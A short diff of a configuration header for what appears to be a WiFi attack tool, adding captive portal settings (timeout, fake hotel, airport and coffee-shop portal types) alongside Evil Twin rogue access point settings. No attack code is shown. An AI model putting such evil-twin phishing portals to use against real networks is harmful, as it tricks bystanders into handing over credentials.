@@ -29,7 +29,9 @@
 // Target Network (will be selected from scan - no need to hardcode)
 // You'll choose the target network interactively from the menu
 
-// Evil Twin Settings (when launching attack)
+// Captive Portal Settings
+#define CAPTIVE_PORTAL_TIMEOUT 300000  // Auto-stop after 5 min (0 = never)
+#define DEFAULT_PORTAL_TYPE PORTAL_GENERIC  // PORTAL_GENERIC, PORTAL_HOTEL, PORTAL_AIRPORT, PORTAL_COFFEE
 #define EVIL_TWIN_CHANNEL 1       // WiFi channel (1-13)
 #define MAX_CLIENTS 4             // Maximum connected clients
 #define AP_HIDDEN false           // Hide SSID? (false = visible)
